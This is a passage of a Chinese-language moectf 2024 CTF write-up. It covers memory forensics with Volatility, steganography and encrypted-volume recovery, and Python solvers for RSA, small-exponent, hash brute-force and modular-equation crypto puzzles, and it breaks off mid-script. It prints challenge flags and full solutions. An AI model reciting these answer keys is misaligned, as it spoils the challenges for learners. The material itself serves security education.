It</h2><p>orz这题历时写了很长时间，总结就是其实和图片没什么关系，直接看hint</p><p>做题流程：豆包搜索西安带&quot;的&quot;的幼儿园，跳出了吉的堡幼儿园，简单的百度地图搜一下几个位置，发现有个小区有两个吉的堡幼儿园，最后拼写的就是moectf{ji_di_bao_you_er_yuan}</p><h2 id="ez_forensics"><a class="markdownIt-Anchor" href="#ez_forensics"></a> ez_Forensics</h2><p>取证这一块我没这么了解过</p><p>按流程正常输入一些内容就行(毕竟这个比较简单)</p><p>拖入虚拟机使用vol</p><p>常见的先看看什么镜像</p><p><code>vol.py -f ../flag.raw imageinfo</code></p><p>得到镜像折后可以看一下进程</p><p><code>vol.py -f ../flag.raw --profile=Win7SP1x64 pslist</code></p><p>可以注意到cmd.exe，根据题目的提示，我们需要得到cmd里面的flag</p><p>进行cmdscan扫描</p><p><code>vol.py -f ../flag.raw --profile=Win7SP1x64 cmdscan</code></p><p>得到了flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">CommandProcess: conhost.exe Pid: 2268<br>CommandHistory: 0x32b0a0 Application: cmd.exe Flags: Allocated, Reset<br>CommandCount: 3 LastAdded: 2 LastDisplayed: 2<br>FirstCommand: 0 CommandCountMax: 50<br>ProcessHandle: 0x60<br>Cmd <span class="hljs-comment">#0 @ 0x330410: echo moectf&#123;WWBGY-TLVC5-XKYBZ&#125; &gt; flag.txt</span><br>Cmd <span class="hljs-comment">#1 @ 0x30cec0: echo SJW7O^%gt8 &gt; flag.txt</span><br>Cmd <span class="hljs-comment">#2 @ 0x3350b0: del flag.txt</span><br>**************************************************<br></code></pre></td></tr></table></figure><h2 id="ctfer20771"><a class="markdownIt-Anchor" href="#ctfer20771"></a> ctfer2077①</h2><p>先扫看看发现没有东西，用steg看一下，发现有一处有一串内容，data分析一下得到flag</p><p><img src="/../../images/moectf/moectf2024/ctfer2077-1.png" alt="ctfer2077-1"></p><p>moectf{84d7f247-3cba-4077-ba25-079f3ac7bb8a}</p><h2 id="ctfer20772"><a class="markdownIt-Anchor" href="#ctfer20772"></a> ctfer2077②</h2><p>加密卷用veracrpt进行解密，然后使用DiskGenius进行恢复文件得到一段内容，打开发现没有明显的内容，估计是被删了，去修复一下。有一个小鹤.txt的文件，内容是</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">ulpb vfde hfyz yisi buuima<br>key jqui xxmm vedrhx de qrpb xnxp<br>ulpb ui veyh dazide<br></code></pre></td></tr></table></figure><p>经过分析是双拼打的字，进行简单分析得到key</p><p>shuangpinshizheyangdazide</p><p>加个moectf就是flag</p><h2 id="ctfer20773"><a class="markdownIt-Anchor" href="#ctfer20773"></a> ctfer2077③</h2><p>流量包导出内容，然后upload文件利用foremost解开得到压缩包，解压得到一些文件。</p><p>有个gif动图隐约能看见有字提取一下内容，得到key:C5EZFsC6</p><p>正常用aud打开发现没什么内容，注意是MP3文件，尝试用MP3stego解密</p><p><img src="/../../images/moectf/moectf2024/mp3.png" alt="mp3"></p><p>得到了文件，是brainfuck转text的内容，得到了字符串H5gHWM9b</p><p>解开压缩包是3个txt文件，缩小观察是福尔摩斯小人，上图片</p><p><img src="/../../images/moectf/moectf2024/%E7%A6%8F%E5%B0%94%E6%91%A9%E6%96%AF.png" alt="福尔摩斯"></p><p>挨个对应然后输入就是以下字符串，最后套个moectf{}</p><p>people_dancing_happily</p><h1 id="现代密码学"><a class="markdownIt-Anchor" href="#现代密码学"></a> <strong>现代密码学</strong></h1><h2 id="现代密码学入门指北"><a class="markdownIt-Anchor" href="#现代密码学入门指北"></a> 现代密码学入门指北</h2><p>根据文本写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes, inverse<br><br><span class="hljs-comment"># 给定的参数</span><br>p = <span class="hljs-number">197380555956482914197022424175976066223</span><br>q = <span class="hljs-number">205695522197318297682903544013139543071</span><br>n = <span class="hljs-number">40600296529065757616876034307502386207424439675894291036278463517602256790833</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">36450632910287169149899281952743051320560762944710752155402435752196566406306</span><br><br><span class="hljs-comment"># 计算 φ(n)</span><br>phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># 计算解密指数 d</span><br>d = inverse(e, phi)<br><br><span class="hljs-comment"># 解密密文 c 得到明文 m</span><br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><br><span class="hljs-comment"># 将明文 m 转换为字节</span><br>flag = long_to_bytes(m)<br><br><span class="hljs-comment"># 输出解密的结果</span><br><span class="hljs-built_in">print</span>(flag.decode())<br><br></code></pre></td></tr></table></figure><h2 id="signin-2"><a class="markdownIt-Anchor" href="#signin-2"></a> Signin</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> inverse, long_to_bytes, GCD<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> symbols, solve<br><br><span class="hljs-comment"># 先定义已知的变量</span><br>c = <span class="hljs-number">5654386228732582062836480859915557858019553457231956237167652323191768422394980061906028416785155458721240012614551996577092521454960121688179565370052222983096211611352630963027300416387011219744891121506834201808533675072141450111382372702075488292867077512403293072053681315714857246273046785264966933854754543533442866929316042885151966997466549713023923528666038905359773392516627983694351534177829247262148749867874156066768643169675380054673701641774814655290118723774060082161615682005335103074445205806731112430609256580951996554318845128022415956933291151825345962528562570998777860222407032989708801549746</span><br>pq = <span class="hljs-number">18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687154230787854196153067547938936776488741864214499155892870610823979739278296501074632962069426593691194105670021035337609896886690049677222778251559566664735419100459953672218523709852732976706321086266274840999100037702428847290063111455101343033924136386513077951516363739936487970952511422443500922412450462</span><br>qp = <span class="hljs-number">18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687077087914198877794354459669808240133383828356379423767736753506794441545506312066344576298453957064590180141648690226266236642320508613544047037110363523129966437840660693885863331837516125853621802358973786440314619135781324447765480391038912783714312479080029167695447650048419230865326299964671353746764860</span><br>n = <span class="hljs-number">18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687534959910892789661065614807265825078942931717855566686073463382398417205648946713373617006449901977718981043020664616841303517708207413215548110294271101267236070252015782044263961319221848136717220979435486850254298686692230935985442120369913666939804135884857831857184001072678312992442792825575636200505903</span><br>p_q = <span class="hljs-number">279533706577501791569740668595544511920056954944184570513187478007551195831693428589898548339751066551225424790534556602157835468618845221423643972870671556362200734472399328046960316064864571163851111207448753697980178391430044714097464866523838747053135392202848167518870720149808055682621080992998747265496</span><br>e = <span class="hljs-number">65537</span><br><br><span class="hljs-comment"># 恢复 p 和 q</span><br>x = symbols(<span class="hljs-string">&#x27;x&#x27;</span>)<br>equation = x**<span class="hljs-number">2</span> - p_q*x + n<br>solutions = solve(equation, x)<br>p = <span class="hljs-built_in">int</span>(solutions[<span class="hljs-number">0</span>])<br>q = <span class="hljs-built_in">int</span>(solutions[<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># 计算 φ(n)</span><br>phi_n = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># 计算私钥 d</span><br>d = inverse(e, phi_n)<br><br><span class="hljs-comment"># 解密消息</span><br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br>flag = long_to_bytes(m)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Recovered flag: <span class="hljs-subst">&#123;flag.decode()&#125;</span>&quot;</span>)<br><br></code></pre></td></tr></table></figure><h2 id="big-and-small"><a class="markdownIt-Anchor" href="#big-and-small"></a> Big and small</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">import</span> gmpy2<br><br><span class="hljs-comment"># 给定的c, e, n</span><br>c = <span class="hljs-number">150409620528288093947185249913242033500530715593845912018225648212915478065982806112747164334970339684262757</span><br>e = <span class="hljs-number">3</span><br>n = <span class="hljs-number">20279309983698966932589436610174513524888616098014944133902125993694471293062261713076591251054086174169670848598415548609375570643330808663804049384020949389856831520202461767497906977295453545771698220639545101966866003886108320987081153619862170206953817850993602202650467676163476075276351519648193219850062278314841385459627485588891326899019745457679891867632849975694274064320723175687748633644074614068978098629566677125696150343248924059801632081514235975357906763251498042129457546586971828204136347260818828746304688911632041538714834683709493303900837361850396599138626509382069186433843547745480160634787</span><br><br><span class="hljs-comment"># 使用 gmpy2 提供的立方根计算函数</span><br>m, exact = gmpy2.iroot(c, e)<br><br><span class="hljs-comment"># 如果立方根是精确的，我们可以直接获取明文</span><br><span class="hljs-keyword">if</span> exact:<br>    flag = long_to_bytes(m)<br>    <span class="hljs-built_in">print</span>(flag)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;密文可能无法直接解密，或者立方根不精确。&quot;</span>)<br><br></code></pre></td></tr></table></figure><h2 id="ez_hash"><a class="markdownIt-Anchor" href="#ez_hash"></a> ez_hash</h2><p>给的提示其实因为是qq号所以都是数字，直接爆破就好</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-comment"># 给定的哈希值</span><br>target_hash = <span class="hljs-string">&#x27;3a5137149f705e4da1bf6742e62c018e3f7a1784ceebcb0030656a2b42f50b6a&#x27;</span><br><span class="hljs-comment"># 已知的秘密开头</span><br>prefix = <span class="hljs-string">b&#x27;2100&#x27;</span><br><span class="hljs-comment"># 暴力破解可能的秘密</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000000</span>):  <span class="hljs-comment"># 从 000000 到 999999</span><br>    <span class="hljs-comment"># 格式化为 6 位数字，不足的前面补零</span><br>    suffix = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;i:06&#125;</span>&#x27;</span>.encode()<br>    secrets = prefix + suffix<br>    <span class="hljs-comment"># 计算 SHA-256 哈希值</span><br>    hash_value = sha256(secrets).hexdigest()<br>    <span class="hljs-comment"># 检查哈希值是否匹配</span><br>    <span class="hljs-keyword">if</span> hash_value == target_hash:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found secrets: <span class="hljs-subst">&#123;secrets.decode()&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><h2 id="baby_equation"><a class="markdownIt-Anchor" href="#baby_equation"></a> baby_equation</h2><p>首先对这个进行化简</p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><msup><mi>a</mi><mn>2</mn></msup><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><msup><mi>b</mi><mn>2</mn></msup><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>−</mo><mn>2</mn><mo>∗</mo><mo stretchy="false">(</mo><mi>a</mi><mo>−</mo><mi>b</mi><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><mi>a</mi><mo>∗</mo><mi>b</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>=</mo><mo>=</mo><mn>4</mn><mo>∗</mo><mo stretchy="false">(</mo><mi>k</mi><mo>+</mo><mi>a</mi><mo>∗</mo><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">((a^2 + 1)*(b^2 + 1) - 2*(a - b)*(a*b - 1)) == 4*(k + a*b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span></span></span></span></span></p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">(</mo><mi>a</mi><mo>+</mo><mn>1</mn><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo stretchy="false">(</mo><mi>b</mi><mo>−</mo><mn>1</mn><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo>=</mo><mn>4</mn><mi>k</mi></mrow><annotation encoding="application/x-tex">(a+1)^2(b-1)^2=4k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span></p><p>然后还有求a,b</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find</span>(<span class="hljs-params">tot, index, ls</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    递归查找函数，用于寻找合适的因子组合，使得通过这些因子构造出的数字能够还原出 flag。</span><br><span class="hljs-string">    :param tot: 当前的乘积值（初始值为1）。</span><br><span class="hljs-string">    :param index: 当前处理的因子索引。</span><br><span class="hljs-string">    :param ls: 因子列表，包含所有可能的因子。</span><br><span class="hljs-string">    :return: 满足条件的乘积值，如果未找到则返回0。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 基准情况：如果已经检查了所有因子</span><br>    <span class="hljs-keyword">if</span> index == <span class="hljs-built_in">len</span>(ls):<br>        <span class="hljs-comment"># 检查当前的 tot 是否可能包含 flag 的特征字符串（例如 &#x27;moectf&#123;&#x27;）</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;moectf&#123;&#x27;</span> <span class="hljs-keyword">in</span> long_to_bytes(tot):<br>            <span class="hljs-keyword">return</span> tot  <span class="hljs-comment"># 返回找到的值</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>  <span class="hljs-comment"># 没找到返回 0</span><br><br>    <span class="hljs-comment"># 递归查找，尝试包含当前因子的情况</span><br>    a = find(tot * ls[index], index + <span class="hljs-number">1</span>, ls)<br>    <span class="hljs-comment"># 递归查找，尝试不包含当前因子的情况</span><br>    b = find(tot, index + <span class="hljs-number">1</span>, ls)<br><br>    <span class="hljs-comment"># 返回找到的非零结果</span><br>    <span class="hljs-keyword">return</span> a <span class="hljs-keyword">if</span> a != <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> b<br><br><br><span class="hljs-comment"># 给定的常量 k 值</span><br>k = <span class="hljs-number">0x2227e398fc6ffcf5159863a345df85ba50d6845f8c06747769fee78f598e7cb1bcf875fb9e5a69ddd39da950f21cb49581c3487c29b7c61da0f584c32ea21ce1edda7f09a6e4c3ae3b4c8c12002bb2dfd0951037d3773a216e209900e51c7d78a0066aa9a387b068acbd4fb3168e915f306ba40</span><br><br><span class="hljs-comment"># 计算 a1b1 = sqrt(4 * k)</span><br>a1b1 = gmpy2.iroot(<span class="hljs-number">4</span> * k, <span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]<br><br><span class="hljs-comment"># 因子列表，包含可能分解出的因子组合</span><br>fac = [<br>    <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">31</span>, <span class="hljs-number">61</span>, <span class="hljs-number">223</span>, <span class="hljs-number">4013</span>, <span class="hljs-number">281317</span>, <span class="hljs-number">4151351</span>, <span class="hljs-number">339386329</span>, <span class="hljs-number">370523737</span>,<br>    <span class="hljs-number">5404604441993</span>, <span class="hljs-number">26798471753993</span>, <span class="hljs-number">25866088332911027256931479223</span>,<br>    <span class="hljs-number">64889106213996537255229963986303510188999911</span><br>]<br><br><span class="hljs-comment"># 使用递归查找因子组合，得到 a1</span><br>a1 = find(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, fac)<br><br><span class="hljs-comment"># 计算 b1 = a1b1 // a1</span><br>b1 = a1b1 // a1<br><br><span class="hljs-comment"># 使用 long_to_bytes 将 a1 和 b1 转换为字节并输出 flag</span><br><span class="hljs-built_in">print</span>(long_to_bytes(a1 - <span class="hljs-number">1</span>) + long_to_bytes(b1 + <span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><h2 id="new_system"><a class="markdownIt-Anchor" href="#new_system"></a> new_system</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br><span class="hljs-comment"># 给定的值</span><br>a1, c1 = [<span class="hljs-number">48152794364522745851371693618734308982941622286593286738834529420565211572487</span>, <span class="hljs-number">21052760152946883017126800753094180159601684210961525956716021776156447417961</span>]<br>a2, c2 = [<span class="hljs-number">48649737427609115586886970515713274413023152700099032993736004585718157300141</span>, <span class="hljs-number">6060718815088072976566240336428486321776540407635735983986746493811330309844</span>]<br>a, c = [<span class="hljs-number">30099883325957937700435284907440664781247503171217717818782838808179889651361</span>, <span class="hljs-number">85333708281128255260940125642017184300901184334842582132090488518099650581761</span>]<br>q = <span class="hljs-number">105482865285555225519947662900872028851795846950902311343782163147659668129411</span><br><br>b = (c - c1 - c2) % q<br>d = (a - a1 - a2) % q<br><br><span class="hljs-keyword">assert</span> b &gt; <span class="hljs-number">0</span><br><span class="hljs-keyword">assert</span> d &gt; <span class="hljs-number">0</span><br><span class="hljs-keyword">assert</span> gmpy2.gcd(d, q) == <span class="hljs-number">1</span><br>inv_d = gmpy2.invert(d, q)<br>x = (b * inv_d) % q<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;The value of x is: <span class="hljs-subst">&#123;x&#125;</span>&quot;</span>)<br><br>gift = (c - a * x) % q<br><span class="hljs-built_in">print</span>(long_to_bytes(gift))<br></code></pre></td></tr></table></figure><h2 id="rsa_revenge"><a class="markdownIt-Anchor" href="#rsa_revenge"></a> RSA_revenge</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">import</span> 